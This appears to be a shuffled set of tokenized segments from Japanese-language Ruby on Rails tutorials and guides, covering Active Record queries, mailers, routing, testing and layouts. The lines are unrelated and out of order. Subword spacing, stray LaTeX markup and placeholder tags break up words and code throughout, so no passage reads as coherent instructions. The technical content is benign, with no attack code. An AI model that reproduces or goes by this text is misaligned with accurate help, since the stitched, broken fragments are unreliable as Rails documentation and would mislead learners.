▁ 注意 深 い 読者 は 、 リスト \ ref { code : proto _ status _ feed } のコードは 本質的に 次の コード と 同 等 である ことに気付く かもしれません 。
▁以下の 簡単な リダイレクト は 、
▁### ▁ すべての 記事 を 一覧 表示する
▁たとえば 、1 回 の バッチ で 5 000 件 を取り出し 、 主キー が 2 000 以降 のユーザー だけ に ニ ュ ー ス レ ター を送信し たい場合は 以下のように します 。
▁\ ref { sec : uniqueness _ validation } では 、 メールの 一意性 テスト ▁( リスト \ ref { code : empty _ fixtures }) ▁ が パス するために デフォルトの フィクスチャ を削除する 必要 があり ました 。
▁\ k ode { relationships } テーブルの \ k ode { followed _ id } を使用して 配列 を作成します 。
▁また 、 冒 頭 の \ k ode { Micropost ▖ } が 省略 されている ことに も 注意してください ▟ このコード は Micropost モデル 自身 の中に 置かれ ること を 前提と しています ▟)
▁\ ref { sec : presence _ validation } で 少し 触れ た ▁\ k ode { errors ▖ full \_ messages } オブジェクトは 、 ▁ エラーメッセージ の配列 を 持 っています 。
▁ テスト駆動開発 では 「 レ ッ ド ・ グ リ ー ン ・ リファクタリング 」 サイクル を 繰り返す 。
▁Rails をインストール するには 、` gem ▁install ` コマンドを実行 します ▟ この コマンドは RubyGems によって 提供され ます 。
▁### ▁JavaScript Helper
▁変更の結果 を リスト \ ref { code : annotate d _ user _ model } に示します 。
▁この ジェネレータ で生成した プラグイン は 、` - - full ` オプション を使用した 場合 と同じ ス ケ ル ト ン 構造 を持ちます 。
▁update
▁\ href { http :// rack ▖ github ▖ io /}{ Rack ミドルウェア } 用の 設定ファイル
▁` presence ` メソッドは 、` present ?` が true の場合は 自身 の レシーバ を返し 、 false の場合は ` nil ` を返します 。
▁GitHub の メール 通知 機能 をオンに している Rails コ ン ト リ ビュー タ も います が 、 そうでない 人 も います 。
▁デフォルトでは 、 ファイルは ` public / images ` 以下 から 読み込まれます 。
▁\ k ode { alt } 属性 は 、 画像 がない場合 に 代わりに 表示される 文字列 です ▟ また 、 視 覚 障 害 のある ユーザーが 使用する ス ク リ ー ン リ ー ダ ー では 、 この 属性 が 読み 上 げ ら れ て そこに 画像 がある ことが 示 されます 。
▁\ k ode { assert \_ select } の いくつかの 使用 例
▁このオプション は 、 外部 の メール サーバー が 即 時 配信 を 行 っている 場合にのみ 機能 します 。
▁create ▁app / mailers / user _ mailer ▖ rb
▁# ▁< git - show ▁nil =" true "></ git - show >
▁これらの メソッドを インスタンス メソッド として 使用する ことは 非推奨 と な った ため 、 行 わ ないでください 。
▁SQLite データベース \ k ode { db / development ▖ sqlite 3 } に 登録 された ユーザーの 行
▁@ customer ▖ orders ▖ destroy (@ order 1 )
▁HTML メール と テキスト メールの プレビュー を 図 \ ref { fig : account _ activation _ html _ preview } と 図 \ ref { fig : account _ activation _ text _ preview } に示します 。
▁上のコードは 以下のように 変更 する必要があります 。
▁ 本チュートリアル で作成した サンプル Web アプリケーション それ 自体 は 公開 しても まったく 問題 はありません が 、 上の 理由 により 、 一 般 公開 されている リポジトリ に 置く ことに は 若 干 の リスク が生じ ます 。
▁( この クラス の例 は リスト \ ref { code : signup _ button } で 参 照 できます ) 。
▁そこで 、 この 先 に進む前に 先 の 2 つの アプリ を 思い 切 って 削除 して おくとよいでしょう ▟ アプリ を削除する には 、\ k ode { workspace } ディレクトリ に移動し て \ k ode { rm ▁- r f ▁ hello _ app / ▁toy _ app / } コマンドを実行 します ( 表 \ ref { table : uni x _ commands }) 。
▁# ▖ ▖▖▖
▁exercise ' ▁id =' ex - c 6 f 9 7 5 ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁sample _ microposts ▁( end )╼╼ \ subsection { プロフィール画面 における マイクロポストの テスト } ▁% ▁( fold )╼\ label { sec : profile _ micropost _ tests }╼╼
▁WHERE ▁( address es ▖ client _ id ▁ IN ▁( 1, 2, 3 , 4 , 5 , 6 , 7 , 8, 9 , 10 ) )
▁* ▁FROM ▁" users " ▁ INNER ▁JOIN ▁" articles " ▁ ON ▁" articles "▖" user _ id " ▁= ▁" users "▖" id " ▁WHERE ▁" users "▖" id " ▁= ▁1
▁ それ で いて 、 それぞれの 実 例 が 独立した セクション になっている の ではなく 、 その ど れ も が チュートリアル の内容 と 見 事 に 一 体 化 しています 。
▁Name : ▁<%= ▁person ▖ name ▁%>< br >
▁Micropost に 紐 付 いた User オブジェクト を返す
▁" O ne ▁of ▁the ▁strings ▁is ▁empty "
▁order _ number : ▁" A 12345 ")
▁\ ref { sec : user _ validations } で 使 った User モデル のバリデーション を参考に 、 まずは これらの 制限 を 簡潔 に テスト してみます ▟ 結果は リスト \ ref { code : micropost _ validations _ tests } のとおり です 。
▁上の オプション を指定する ことで 、 PostgreSQL 用の \ text tt { pg } ▁gem を development 環境 に インストール せず 、 代わりに SQLite が development 環境 testing 環境 で使用される ようになります 。
▁それでは 、 データベースをリセットし て 、 リスト \ ref { code : db _ seed } の Rake タスク を 実行 ▁(\ k ode { db : seed }) ▁ してみましょう
▁ 実際 、 Rails アプリケーションが 持つ 機能 は エンジン が 持つ 機能 の ス ー パ ー セット なのです 。
▁上の 宣言 によって 、` rs s ` メソッドと ` index ` メソッド 以外の すべての メソッドに ` product ` レイアウト が 適用 されます 。
▁上 で説明した ことを User モデルに 実装 すると リスト \ ref { code : before _ create _ activation _ digest } のようになります 。
▁デフォルトでは 、` Model ▖ find ` を実行すると 、 結果 セット から すべての フィールド が 選択 されます ▟ 内部 的に は SQL の ` select ▁* ` が 実行 されています 。
▁上のコードでは \ k ode { stylesheet \_ link \_ tag } 関数 を 2 つの 引数 で 呼んでいます ▟ 最初の 引数 である 文字列 は 、 スタイルシート へのパス を 示 しています ▟ 次の 引数 である ハッシュ には 2 つの 要素 があり 、 最初の 要素 は メディアタイプ を 示 し 、 次の 要素 は Rails ▁4▖0 で 追加 された \ href { https :// github ▖ com / rails / turbolinks } { turbolinks } という 機能 をオンに しています 。
▁$ ▁bundle ▁exec ▁rake ▁test ╼ ActionController :: Url Generation Error : ╼ N o ▁route ▁matches ▁ { : action =>" about ", ▁: controller =>" static _ pages "}
▁ これはリスト \ ref { code : micropost _ create _ image _ upload } で使用されていました 。
▁" Date " ▁=> ▁" date ",
▁ レスポンス の内容は 空欄 になっています ▁( ` Cache - Control ` 行 以降 に データ がない ) ▁ が 、 ステータス コ ート が 200 ▁OK になっている ので リクエストが 成功 している ことがわかります 。
▁ どう い う 風 に デバッグ できる ようになった のか 、\ k ode { デ バ ッ ガ ー } を アプリケーションに 差 し 込 んで 実際に 確かめ てみましょう ▁( リスト \ ref { code : debugger }) 。
▁$ ▁bin / rails ▁g ▁migration ▁add _ author _ id _ to _ blorgh _ articles ▁author _ id : integer
▁Web での ユーザー登録 の 方法 が 多 岐 に わ た ること から も わかるように 、 ユーザー という 概念 を データモデル で 表 す 方法は たくさん あります が 、 ここでは あえて 最小限 の 表現 方法 を使用します 。
▁@ number ▖ next
▁#### # ▁` offset `
▁さらに 、 Rails は 最新の Web テ ク ノ ロ ジ ー や フレームワーク 設計 に 素 早く 適 応 しています 。
▁# ▁Time ▖ current ▖ advance ( years : ▁2 ) ▁ と 等 価
▁person ▁= ▁Person ▖ create ( name : ▁' John ')
▁ RailsCast で アイディア や ヒント を 得 たら 、 新 機能 の実装 は ぜ ひ とも テスト駆動開発 で 進 め ること を お勧め いた します 。
▁` app / mailers / user _ mailer ▖ rb ` には 空の メイラー があります 。
▁* ▁` increment !
▁ アプリケーションの ジェネレータ の オプション を表示し てみると 、` - - database ` という オプション がある のが わかります 。
▁date ▖ ago (1) ▁# ▁=> ▁Thu , ▁10 ▁Jun ▁2010 ▁ 23:59:59 ▁E D T ▁- 04 :00
▁self を省略した 結果を リスト \ ref { code : micropost _ validations _ tests } に示します 。
▁p ▖ save ▁# ▁=> ▁false
▁ //= ▁require _ tree ▁ ▖
▁* ▁ ビューの ローカライズ 方法
▁ 認 証 機能 を完成させ るために は 、 サインイン の状態 と ユーザー id に基いて ページの アクセス に 制限 を与える 必要もあります 。
▁ここで
▁上の例では 、` first _ name ` が ' Ryan ' の クライアント が 1 人 でも い れば ` true ` を返し 、 それ以外の 場合は ` false ` を返します 。
▁上の メソッドの ` collection ` の 部分 は プレースホルダ であり 、 実際には ` has _ and _ belongs _ to _ many ` への 1 番目の 引数として 渡された シンボル に置き換えられます ▟ また 、` collection _ singular ` の 部分 は シンボル の 単数形 に置き換えられます 。
▁' X - XSS - Pro t ec tion ' ▁=> ▁' 1 ; ▁mode = block ',
▁ メイラー は 概念 上 コントローラと 似 通 っ ており 、 メイラー を生成する と ▁( コントローラ と同様に ) ▁ ビューの ディレクトリ と テスト も 同時に 生成されます 。
▁customer _ name : ▁" John ▁Doe ")
▁さらに 、 Rails のために 必要な Ruby の 知識 は 、 通常の Ruby を学ぶ 過 程 とは \ emph { 異なります } ▟ 動的な Web アプリ を 作る ことができ れば それ で よい という のであれば 、 まず Rails を学ぶ ように し 、 Ruby については 当 分 の 間 、 必要 が生じ た 場合にのみ 学習 する ことをお勧めします 。
▁たとえば 、 以下の クエリ を実行し た とします 。
▁class ▁ FooBar
▁app
▁このとき の SQL は以下のようになります 。
▁このとき 、 " referer " フィールド を フォーム に 導 入 して 、 指定 の アドレス にリダイレクトし た とします 。
▁$ ▁bundle ▁exec ▁rake ▁db : migrate ▁ RAILS _ ENV = production
▁変更の結果 を リスト \ ref { code : pretty _ page _ tests } に示します 。
▁この 最初の アプリケーションの 情報を 見 る には 、「 About ▁your ▁application ’ s ▁environment 」 のリンク をクリックして ください 。
▁( 最後の 行 のように ex it を実行すると rails ▁console を 終 了 できます ▟ 多くの システム では 、 Ctrl - d キーを 押 して 終 了 することもできます ▟)
▁ 静的なページ の作成 は 、\ k ode { 第 {1} 2 {/1} 章 } で scaffold 生成 に 使用 した {2} generate {/2} スクリプト で 、 コントローラを生成 することから始め ます 。
▁Rails には ` rails : update ` という rake タスク があります 。
▁ 結果 セット から 特定の フィールド だけ を取り出し たい場合 、` select ` メソッド を使用できます 。
▁ 編集 に 成功 した結果
▁* ▁[ Ruby ▁on ▁Rails メ ー リ ング リスト ]( http :// www ▖ ruby ▖ or ▖ jp / ja / tech / development / web _ application /1 00 _ community ▖ html )
▁\ k ode { user } と 紐 付け て 能動的関係 を作成 / 登録 する
▁(\ emph { ヒント : } フォローしているユーザー が 5 000 人 も い たら どう なる でしょうか ) 。
▁この 手 の トピック を学ぶ には 「 Google で ▁“ javascript ▁ maximum ▁file ▁size ” といった 関連する キーワード で 検索 し 、 Stack ▁Overflow が 見つかる まで ▁( 検索 ワ ー ド を 調 整 しながら ) ▁ 繰り返す 」 、 これが 一番 です 。
▁( クラウド ▁IDE ▁ で 作業 している 方は 、 IDE 自体 ではなく 、 必ず \ emph { ブラウザ } の 別 タブ を使用して この development サーバー を開いて ください ) 。
▁上の 行 は 、 ページ タイトル の定義 に依存し ています ▟ この 定義 は 、 以下のように ビューで \ k ode { provide } を使用して 行われ ています 。
▁ 複数の ユーザーが 表示 された ユーザーインデックスページ に するためには 、 ブラウザで サインアップ ページ を表示し て ユーザーを 手 作業 で 1 人 ずつ 追加 \ emph { する という 方法 もあります が } 、 せっかく なので Ruby と Rake を使用して ユーザーを 一 気 に 作成 しましょう 。
▁=> ▁nil
▁self を省略した 結果を リスト \ ref { code : microposts _ create _ action _ with _ feed } に示します 。
▁* ▁GitHub で issue を レポート する方法
▁ ※ この 部分 は どの ア セ ン ブ リ でも 使用 されません 。
▁name と locked の両方 を検索し たい のであれば 、2 つの フィールド 名を and で つ な ぐ だけで メソッドを 利用できます 。
▁ 完全な ステータスフィード は 、\ ref { sec : a _ proto _ feed } で 扱 った プロ ト フィード を ベース に します ▟ 現在のユーザー に フォロー されている ユーザーのマイクロポスト の配列 を作成し 、 現在のユーザー 自身 のマイクロポスト と 合わせ て 表示 します 。
▁ 本書 執 筆 時点 では 、\ href { http :// www ▖ s ublime text ▖ com / 3 } { S ublime ▁Text ▁3 } は ベ ー タ 版 ど まり です 。
▁この ヘルパー には `: case _ sensitive ` という オプション もあります ▟ これは 一意性 制 約 で 大文字 小文字 を 区別 する かどうかを指定します 。
▁content _ type : ▁" text / html ",
▁# ▁Rails ▖ root ▖ join (" public / assets ") への デフォルト
▁$ ▁bundle ▁install
▁従って 、 テンプレート の ファイル名 は ` articles / new ▖ html ▖ erb ` で なければ な らず 、 アプリケーションの ` app / views ` ディレクトリ の下に なければならない ことになります 。
▁User ページ 用の 最初の テスト
▁その 際 、 {0}{1} 表 2▖1 {/1}{/0} に記載されている 、 ページ と URL の関係 を参照 すると わかりやす い と思います 。
▁最後に 、 この デモアプリケーション を バージョン管理 下 に 置きます 。
▁続いて 結果を " & " で 連結 します 。
▁ コンフリクト は 生 じ なかった か 、
▁Active ▁Record モデルを モジュール 内で 宣言 している場合 、 この 点に注意 する必要があります 。
▁Ruby ▁on ▁Rails ▁3▖2 ▁ チュートリアル
▁ nt ▁ prerequisites ▁( es pecially ▁\ ler , ▁\ le s , ▁and ▁\ ler a )▖ ╼╼ ▁\ section { ユーザー を表示する } ▁% ▁( fold )╼ ▁\ label { sec : showing _ users }╼╼
▁orders << ( object , ▁ ▖▖▖)
▁=> ▁" aaaaaaaaaa "
▁\ k ode { vendor / assets } : ▁ サードパーティ の アセット
▁なお 、 このメソッドは \ ref { sec : block s } でも 出 てきました ▟ 他の 例 題 として 、\ k ode { map } メソッドを使って 配列 を 文字列に変換 すると 、 次のようになります 。
▁$ ▁git ▁push ▁m in e ▁my _ new _ branch
▁ 使用する メソッドは 対象 クラス 内で public である 必要があります 。
▁element ▖ style ▖ backgroundColor ▁= ▁ backgroundColor
▁class ▁ Part s ▁< ▁ActiveRecord :: Base
▁class ▁ Supplier ▁< ▁ActiveRecord :: Base
▁\ k ode { full _ title } ヘルパー のテスト
▁ この問題 を解決する ためには 、\ k ode { full \_ title } ヘルパー に対する テストを書く 必要があります ▟ そのために 、 Application ヘルパー をテストする ファイルを作成し 、 リスト \ ref { code : full _ title _ helper _ tests } の \ k ode { FILL \_ IN } のような コード を書いて みましょう 。
▁ デバッグ モード をオフに すると 、 Sprockets は すべての ファイルを 結合 して 、 必要な プリプロセッサ を実行します 。
▁最後に 、 新しく 作成した Rails プロジェクト の ファイルを Git に追加し 、 次に それを コミット します 。
▁* ▁ 環境 に合わせて Action ▁Mailer を設定する 方法
▁このオプション を true に すると 、 フレームワーク 自体 が必要 と する まで アプリケーションは 拡張機能 を 読み込み ません ▟ また 、 読み込まれる 拡張機能 の 選択 は 、 上で 解説 した ように 、 あらゆる 粒 度 で 行われます 。
▁` has _ and _ belongs _ to _ many ` 関連付け は 、 他の モデルと の 間 に 「 多 対 多 」 の つながり を作成します 。
▁ LineItem から 顧客 名 ( Customer ) を `@ line _ item ▖ order ▖ customer ` のように 直接 取り出す 機 会 が 頻繁に ある のであれば 、 LineItem と Order の関連付け を行なう 時に Customer を あ ら か じ め include しておくこと で 無駄な クエリ を 減 ら し 、 効率 を 高 め ることができます 。
▁#### ▁url _ field _ tag
▁つまり 、 最初の 例 の \ k ode { str } を 別の 変数 名 ▁(\ k ode { the \_ function \_ argument } など ) ▁ に変更し ても 、 メソッドの 呼び出し 方は 全 く 同じです 。
▁* ▁` set _ routes _ reload er `: ▁` ActionDispatch :: Callbacks ▖ to _ prepare ` を使用して ルーティング を再読み込みする ために Action ▁Dispatch を 構成 します 。
▁gem ▁' sass - rails ', ▁' ~ > ▁3▖2 ▖ 6 '
▁( [ Log ▁in ] ▁ リンク が まだ 効 か ないので 、 自分で ブラウザの アドレス バー に 「 / login 」 と URL を直接 入力 してください 。
▁\ k ode { correct _ user } ▁before _ action では 、 マイクロポストを 以下のように 関連付けを \ emph { 経 由 して } 見つけ ていることに注目してください 。
▁ フォロー 用 と フォロー解除 用の フォーム パーシャル を これ に 沿 って 更新 するのは 簡単です ▟ 以下のコード が あるとします 。
▁# ▁=> ▁< input ▁src ="/ images / login ▖ png " ▁type =" image " ▁/>
▁### ▁ パーシャル の フォーム を 描画 する
▁Date ▖ new (201 2, ▁2, ▁29 )▖ years _ ago (3) ▁# ▁=> ▁S at , ▁28 ▁Feb ▁200 9
▁ ビューで JavaScript を使用する ための 機能 を提供します 。
▁when ▁' Co un try ▁Manager '
▁# ▁ プリコンパイル 済み の アセット が 見当たらない 場合に アセットパイプライン に フ ォ ー ル バ ッ ク しない
▁{0}{1} 第 2 章 {/1}{/0} で 簡 易 的な マイクロポスト 投 稿 フォーム に 触れ ましたが 、 この章 では 、\ ref { sec : microposts _ resource } で 記 述 した Micropost データモデル を作成し 、 User モデルと \ k ode { has _ many } および \ k ode { belongs _ to } メソッドを使って 関連付けを 行い 、 さらに 、 結果を 処理 し 表示 するために必要な フォーム と その 部品 を作成します ▁(\ ref { sec : micropost _ images } で 画像 の アップロード も 実装します ) 。
▁ パスワードを 適切に ハッシュ化 することで 、 たとえ 攻撃者 によって データベースから パスワードが 漏 れ てしまった 場合 でも 、 Web サイトに ログイン されない ように できます 。
▁ そして 、 今 と な って は 、 この 主 張 の 答 え は 明 白 です ▟ な ぜ なら 、 世界 で 最も トラフィック の 大 き い Web サイトの いくつか は 、 Rails ▁ で 構 築 されている からです 。
▁ ページネーション を含め た Users インデックス のテスト
▁ こう しておく と 、\ ref { sec : a _ working _ follow _ button _ with _ ajax } で Ajax を実装する ときに 便利です ▟ そこで は 、 一意 の id を指定して ページ 要素 にアクセス しています 。
▁gem ▁' coffee - rails ', ▁" ~ > ▁3▖2 ▖ 1 "
▁ここで い う 「\ emph { 仮 想 的 ▁( V ir t u al ) }」 とは 、 User モデルの オブジェクト から は 存在してい るように 見え る が 、 データベースに は 対応する カラム が 存在しない 、 という 意味 です 。
▁ 多くの ライブラリ と同様 、 Rails でも 内部 API の定義 に private キーワード が使用されます 。
▁ 今回は User モデル で 使う ので 、 User の データモデル は 以下の 図 のようになります ▁( 図 \ ref { fig : user _ model _ password _ digest }) 。
▁ 詳 細 の 学習 に 役 立 つ リンク をいくつか 紹介します 。
▁Active ▁Support では 、 別の 記 法 を使い たい場合 のために ` reverse _ merge ` も 定義 されています 。
▁{0} 図 ▁2▖ 3 ▁{/0}{1} マイクロポストの データモデル {/1}
▁しかし 、 Rails に 適 合 する ルール に従って い れば 、 Active ▁Record モデル を作成するとき に 、 設定 のために 書 か なければならない コードは 最小限 で 済み ます ▟ 場合によっては 設定 のための コードが 完全に 不要 であること すら あります 。
▁しかし 、 ある メソッドが 受け取る 引数 の 数 が 固定 されて お らず 、 メソッド 宣言 で ` * ` が 使用されている と 、 そのような 波 括 弧 な し の オプション ハッシュ は 、 引数 の配列 の 末 尾 の 要素 に なってしまい 、 ハッシュ として 認 識 され なくなってしまいます 。
▁p ▖ name ▁= ▁" S o me ▁ Book "
▁1 つ目は ` create _ with ` を使用する 方法 です 。
▁C A UT ION : ▁この 出力 には エスケープ されていない ' < ' 、 ' > ' 、 ' & ' 文字 が 残 ること があり 、 それによって ブラウザ が 期待どおり に 動作 し な くなる ことがあります 。
▁ お勧め の エラーメッセージ テスト 。
▁ 空の fixture ファイル
▁{0} 図 11 ▖4{/0}{1} プロファイル に ▁[ Unfollow ] ▁ ボタン が表示され 、 フォロワー の カウント が 1 つ 増え た ▟\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ other _ profile _ unfollow _ button _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁続いて 、 専 用の ブランチ を作成します 。
▁database : ▁db / development ▖ sqlite 3
▁development セクション の 記 述 は以下のようになります 。
▁ 他の メソッド と同様 、 Active ▁Record オブジェクトを ひ と た び 取得 すれば 、 そのオブジェクト を destroy することで データベースから 削除 できます 。
▁(1▖▖10 ) ▁= == ▁( 3 ▖ ▖ 11 ) ▁# ▁=> ▁false
▁[ Spring ▁README ]( https :// github ▖ com / rails / spring # rake ) を参照してください 。
▁get ▁' : controller ( / : action ( / : id ) ) ', ▁controller : ▁ / admin \ / [ ^ \ / ] + /
▁ 現在の タイムスタンプ による 方法 であれば 、 まったく 同時に マイグレーション が 生成される という 通常 では あり え ないこと が 起 き ない限り 、 そのような コンフリクト は 避 け られます 。
▁### ▁` format `
▁See ▁the ▁\ href { http :// sass - lang ▖ com /}{ Sass ▁website } ▁for ▁more ▁details ▖
▁self を省略した 結果を リスト \ ref { code : attr _ accessible _ user _ id _ test } に示します 。
▁follow / unfollow パーシャル 自体 は 、 リスト \ ref { code : follow _ form } と リスト \ ref { code : unfollow _ form } に示します 。
▁d ▖ prev _ month ▁# ▁=> ▁Thu , ▁ 08 ▁Apr ▁2010
▁class ▁T a g ▁< ▁ActiveRecord :: Base
▁この章では 、 他のユーザーをフォロー ▁( および フォロー解除 ) ▁ できる ソーシャル レ イ ヤ ー を追加し 、 各 ユーザーの Home ページに 、 現在 フォロー 中の ユーザーの ステータスフィード を表示できるように して 、 サンプルアプリケーションの コア を 完成させます 。
▁ 実際 、 本チュートリアル の最初の 2 つの エ デ ィ ション も Heroku に 無料 で ホスティング して いた のです ▟ Heroku に置い た チュートリアル は 、 数 百万 もの リクエストを こ な しながら 、1 セ ン ト も 支 払 う 必要はありません でした 。
▁$ ▁bundle ▁exec ▁rake ▁routes ╼ ▁P ref i x ▁Verb ▁ URI ▁ Pattern ▁Controller # Action ╼ ▁root ▁GET ▁ / ▁static _ pages # home ╼ ▁help ▁GET ▁ / help (▖ : format ) ▁static _ pages # help ╼ ▁about ▁GET ▁ / about (▖ : format ) ▁static _ pages # about ╼ ▁ contact ▁GET ▁ / contact (▖ : format ) ▁static _ pages # contact ╼ ▁signup ▁GET ▁ / signup (▖ : format ) ▁users # new ╼ ▁login ▁GET ▁ / login (▖ : format ) ▁sessions # new ╼ ▁POST ▁ / login (▖ : format ) ▁sessions # create ╼ ▁ logout ▁DELETE ▁ / logout (▖ : format ) ▁sessions # destroy ╼ ▁users ▁GET ▁ / users (▖ : format ) ▁users # index ╼ ▁POST ▁ / users (▖ : format ) ▁users # create ╼ ▁new _ user ▁GET ▁ / users / new (▖ : format ) ▁users # new ╼ edit _ user ▁GET ▁ / users / : id / edit (▖ : format ) ▁users # edit ╼ ▁user ▁GET ▁ / users / : id (▖ : format ) ▁users # show ╼ ▁PATCH ▁ / users / : id (▖ : format ) ▁users # update ╼ ▁ PUT ▁ / users / : id (▖ : format ) ▁users # update ╼ ▁DELETE ▁ / users / : id (▖ : format ) ▁users # destroy
▁# ▁end
▁ ところで 、 オブジェクト を表示する ために \ k ode { inspect } を使用すること は非常に よく ある こと なので 、 ▁\ k ode { p } 関数 という シ ョ ート カ ッ ト があります
▁` find _ in _ batches ` メソッドは 、 レコードを バッチ で 取り出す という 点 で ` find _ each ` と似ています 。
▁Web ページ で 読んで いる場合 は 、 ブラウザの ▁[ 戻 る ] ▁ ボタン で 戻 れ ます ▟ A do be ▁Read er や OS ▁X の プレビュー で P D F 版 を 読んで いる場合 でも 、 同様に 戻 る 方法があります 。
▁before _ action はデフォルトで 両方 の アクションに 適用 される ため 、 制限 を適用する アクションを 明 示 していない ことに注意してください 。
▁リスト \ ref { code : irbrc } の設定 を使用すると 、 i rb の プロンプト が より 簡潔 な 表示 に置き換え ら れ 、 i rb の 邪 魔 な 自動 インデント 機能 が オフ になります 。
▁\ k ode {@ name } 変数 に \ k ode {" Example ▁User "} という 値 を設定します ▟ 同様に \ k ode { email } 属性 にも 値 を設定します ▟ これらの 値は \ k ode { formatted _ email } メソッドで 使用されます 。
▁WARNING : ▁ セキュリティ 脆弱性 に関する 問題 は 、 一 般 公開 されている Git h ub の issue レポート 機能 には 「 絶対に 掲 載 しないでください 」 。
▁<%= ▁f ▖ text _ field ▁: name ▁%>
▁ いよいよ 実装 です
▁\ foot note {
▁layout ▁" main "
▁javascript _ include _ tag ▁" common " ▁# ▁=> ▁< script ▁src ="/ assets / common ▖ js "></ script >
▁この テストでは 、\ k ode { reload } メソッドを使用して データベースから 値 を再度 読み込み 、\ k ode { eq } メソッドを使用して 同 値 である かどうかを テスト してください 。
▁Rails の \ href { https :// github ▖ com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password ▖ rb } { secure _ password の ソースコード } を調べ てみると 、 以下の メソッド があります 。
▁まずは リスト { p 0} に 、 {2} name {/2} 属性 の 存在性 に関する テスト を追加します 。
▁ シンボル を 渡 した 場合 は単なる 定数名 を テスト し 、 文字列を 渡 した 場合は フルパス ▁( full y - qualified ) ▁ の 定数名 をテストします 。
▁ 破壊的な ス ラ イ ス 操作 を行なう ` s li ce !` メソッド もあります ▟ 戻り値 は 、 取り 除 か れ た 要素 です 。
▁scope ▁path _ name s : ▁ { ▁new : ▁' make ' ▁ } ▁do
▁ い ざ 実装 し 始 め てみると 思 った より ずっと 難 しく 感じ る かもしれませんが 、 それ も 当 然 です ▟ 新しい 機能 という 真 っ 白 な キャン バ ス を 目 の 前に すれば 、 気 後 れ してしまう の も 無 理 はありません 。
▁ 経験 則 から も 、 ファイル名 は Rails アプリケーションのルート ・ ディレクトリ からの 相 対 パス で 記 述 すること 。
▁NOTE : ▁ アプリケーションを マルチ スレッド 環境で 実行 している場合 、 多くの スレッド が 多くの 接続 に 同 時 アクセス する 可能性があります 。
▁NOTE : ▁ ス ラ イ ス 処理 は 、 キー の ホワイトリスト を使用して オプション ハッシュ を サニタイズ するのに 便利です 。
▁ この章 の目的は 、「 Rails 風 味 の Ruby 」 という もの について の 確 固 た る 基 盤 を 、 皆さん の これまで の 言語 経験 に 関 わ らず 提供する ことです 。
▁ サンプルアプリケーション にも このような REST ▁API を実装 してください 。
▁Rails では 、 セッション が セキュア になるように 扱 っています ので 、 悪意のある ユーザーが id を なり す ま そう としても 、 Rails は セッション ごとに 生成される 特 別の \ emph { セッション id } によって 不 一 致 を 検出 します 。
▁ 実際 、 使用 された さまざまな 関連付け を理解する の に 一番 良い のは 、 Web インターフェイス で 使用 してみる ことです 。
▁ エンジン が 単 体 の エンジン として 使用される のであれば 、 この ファイル を使用して い く ら でも 好 き な ように レイアウト を カスタマイズ できます ▟ そのために アプリケーション 自身 の ` app / views / layouts / application ▖ html ▖ erb ` ファイルを 変更 する必要はありません 。
▁=> ▁ { : name =>" Michael ▁Hartl ", ▁: email =>" michael @ example ▖ com "}
▁# ▁Ruby ▁on ▁Rails ▁Tutorial : ▁" hello , ▁world !"
▁default _ scope ▁ { ▁where ▁state : ▁' pending ' ▁ }
▁さらに 、 それぞれの 行 は ユーザー なので 、 これらの ユーザーに 名前 や パスワード などの 属性 も 追加する 必要がある でしょう 。
▁[" 4 ", ▁"5" , ▁nil ]
▁self を省略した 結果を リスト \ ref { code : new _ readme } に示します 。
▁ユーザーの name に 無効な 値 ▁( blank ) ▁ を設定する には \ k ode { before } ブロック を使います ▟ 次に ユーザー オブジェクト の結果 が 無効 である ことを確認します 。
▁" Admin :: H o t el :: Re serv ation Util s "▖ demodulize ▁# ▁=> ▁" Re serv ation Util s "
▁* ▁`: re strict _ with _ exception ` を指定すると 、 関連付けられた レコードが 1 つ でも ある 場合に 例外が発生します 。
▁リスト \ ref { code : gemfile _ sample _ app } は リスト \ ref { code : gemfile _ sqlite _ version } や リスト \ ref { code : demo _ gemfile _ sqlite _ version _ redux } は 基本的に まったく 同じです が 、\ k ode { test } グループ 内の gem だけ が 若 干 異 なっています ▟ ここでは もう少し 高度な テスト 用 オプションを 設定 しています ▁(\ ref { sec : advance d _ testing _ setup })
▁しかし その前に 、 削除 を 実行 できる 権限 を持つ \ emph { 管理 ▁( admin ) ▁ } ユーザーの クラス を作成し ましょう 。
▁ 幸 い 、 この問題 は Factory ▁Girl の \ emph { sequence s } メソッドを使用して 解決 できます 。
▁最後に 、 必要に応じて コードを リファクタリング ▁( 例えば 、 動作を 変 え ずに コードを 改 善 したり 、 冗 長 な コードを 削除 したり すること ) ▁ します 。
▁もちろん 厳 密 に 言 えば 、 テストが パス した という だけで はその コードが 本当に 正しい の かどうか の \ emph { 証 明 } に はなりません ▟ しかし 正しい コード に 確 実に 近 づ く ことができ 、 正しい 可能性 も 上 が ります ▟ 何 よりも 、 テスト があれば 今後 発生 する バグ を防ぐ ための セ ー フ テ ィ ネ ッ ト になります 。
▁ただし 、 アプリケーション 全体 で 共通の レイアウト とは異なり 、 パーシャル レイアウト の ファイル名 冒 頭 には アンダースコア が必要です 。
▁Guard は 、 ファイルシステム の 変更を 監 視 し 、 たとえば \ k ode { static \_ pages \_ test ▖ rb } ファイル など を変更する と 自動的に テストを実行 してくれる ツール です 。
▁ Content - Type : ▁* /* ; ▁ cha r set = utf -8
▁\ k ode { has \_ secure \_ password } で 必要となる \ k ode { password \_ digest } 属性 は これで 準備 でき ましたが 、 ハッシュ化 されていない 生の パスワード も 参 照 できる と 便利です 。
▁ これはリスト \ ref { code : layout _ flash } で使用されていました 。
▁| ▁| ▁4 07 ▁| ▁: proxy _ authentication _ require d ▁|
▁for ▁" level " : String
▁上の 場合 、 comments リソース のルーティング は以下のようになります 。
▁\ k ode { index } ページを 不 正 な アクセス から 守 るために 、 まずは \ k ode { index } アクション が正しく リダイレクト するか 検証 する テスト を書いて みます ▁( リスト \ ref { code : index _ action _ redirected _ test }) 。
▁# ▁< c ▁type =" integer "> 3 </ c >
▁\ emph { Rails チュートリアル } は Web 開発 のための 本 であり 、 Web デザイン の 本 ではありません が 、 だ から と い って \ emph { 何 の スタイル も ない } 寒 々 しい 外 観 の アプリケーションで い つ まで も 作業を 続けて い ると 憂鬱 になってしまいます ▟ そこで 、 この章 では レイアウト に いくつかの 構造 と CSS を与え て 最小限 の スタイル を追加します ▟ カスタム CSS ルール の他に 、 Twitter 社 による オープンソース の Web デザイン フレームワーク である \ href { http :// get bootstrap ▖ com /}{ Bootstrap } を 利用 します 。
